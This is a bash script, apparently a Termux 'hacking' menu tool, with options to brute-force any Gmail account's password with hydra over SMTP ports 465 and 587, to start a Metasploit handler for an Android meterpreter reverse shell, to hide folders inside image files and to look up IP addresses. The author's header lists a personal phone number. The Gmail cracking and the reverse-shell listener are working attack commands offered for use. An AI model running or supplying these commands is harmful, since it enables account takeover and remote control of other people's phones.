#!/bin/bash
#
#

while [ 1 ]
do
	tput setaf 5
	figlet ++HoRr0r++
	tput setaf 2
	echo "          ================================"
	echo "          |        author sachin         |"
	echo "          |  whats app no 8105190452     |"
	echo "          ================================"
	echo "           1 - hack gmail                "
	echo "           2 - andorid lisionar         "
	echo "           3 - hide file in image		     "
	echo "           4 - trace ip"
	echo "           5 - exit "
	echo "   "
	echo "           99- setup this tool   "
	echo "   "
	tput setaf 3
	echo -n "Select your options :- "
	read sachin

	if [ $sachin -eq 1 ]
	then
		while [ 2 ]
		do
			clear
			echo "---------------------------"
			echo "| gmail hacking squad     |"
			echo "---------------------------"
			echo "| 1 - port 465            |"
			echo "| 2 - port 587            |"
			echo "| 3 - back to menue       |"
			echo "=-------------------------="

			echo -n "Selet port to hack :- "
			read ajay

			if [ $ajay -eq 1 ]
			then
				echo -n "Enter gmail :- "
				read darshan
				echo -n "Pass list path :- "
				read shamanth
				hydra -l $darshan -P $shamanth -s 465 -S -v -V -t 1 smtp.gmail.com smtp 
				break
			elif [ $ajay -eq 2 ]
			then
				echo -n "Enter gmail :- "
				read srujan
				echo -n "Pass list path :-"
				read akshay
				hydra -S -l $srujan -P $akshay -e ns -V -s 587 -t 1 smtp.gmail.com smtp
				break
			elif [ $ajay -eq 3 ]
			then
				echo "back to menue..."
				break
			else
				echo "wrong selection>>>"
				clear
			fi
		done
	elif [ $sachin -eq 2 ]
	then
		cd  $HOME/metasploit-framework
		rm -rf file.rc
		echo -n "Enter your port :- "
		read port
		touch file.rc
		echo "use exploit/multi/handler">> file.rc
		echo "set payload android/meterpreter/reverse_tcp">> file.rc
		echo "set lhost localhost">> file.rc
		echo "set lport $port">> file.rc
		echo "exploit">> file.rc
		sleep 2
		echo "Want to connect database>> 1/0 "
		read data
		if [ $data -eq 1 ]
		then
			pg_ctl -D $PREFIX/var/lib/postgresql start
		fi
		msfconsole -r file.rc
	elif [ $sachin -eq 99 ]
	then
		apt-get install figlet -y
		pkg install ncurses-utils -y
		apt-get update
		apt-get upgrade -y
		apt-get install hydra -y
		apt-get install unzip -y
		apt-get install zip -y
		apt-get install curl -y
	elif [ $sachin -eq 3 ]
	then
		clear
		tput setaf 2
		echo "         ---------------------------------"
		echo "         |hide your files behind an image|"
		echo "         ---------------------------------"
		while [ 3 ]
		do
			echo "            1 - hide "
			echo "            2 - unhide "
			echo "            3 - back to menue"
			echo
			echo -n " Select your option :- "
			read selection
			if [ $selection -eq 1 ]
			then
				cd /sdcard
				ls
				echo " Your in this path `pwd`"
				echo -n "Select any image :- "
				read image
				echo -n "Provide duplicate image name :- "
				read image1
				sleep 2
				echo "[Note : your data should be in folder ]"
				sleep 1
				echo -n "Select folder :- "
				read folder
				zip -r $folder $folder
				rm -rf $folder
				cat $image $folder.zip > $image1
				figlet Done..! 
				rm -rf $folder.zip
				sleep 2
				echo "Your data is hided in this image $image1 "
			elif [ $selection -eq 2 ]
			then
				cd /sdcard
				echo "Your in this path `pwd` "
				ls
				echo -n "Select your image :- "
				read dm
				echo "Extracting >>>>>>........"
				unzip $dm
				rm -rf $dm
				figlet Done..!
			elif [ $selection -eq 3 ]
			then
				break
			else
				echo "wrong selection "
				clear
			fi
		done
	elif [ $sachin -eq 4 ]
	then
		clear
		tput setaf 6
		echo "     --------------------"
		echo "    |  Trace IP adress   |"
		echo "     --------------------"
		echo
		echo "    Goto iplogger website "
		echo -n "Enter targeted IP :- "
		read targ
		curl https://ipinfo.io/$targ 
	elif [ $sachin -eq 5 ]
	then
		echo "Bye Bye ......."
		break
	else
		echo "wrong selection  ....."
	fi

	echo "-------Press enter to continue--------"
	read x
	clear
done

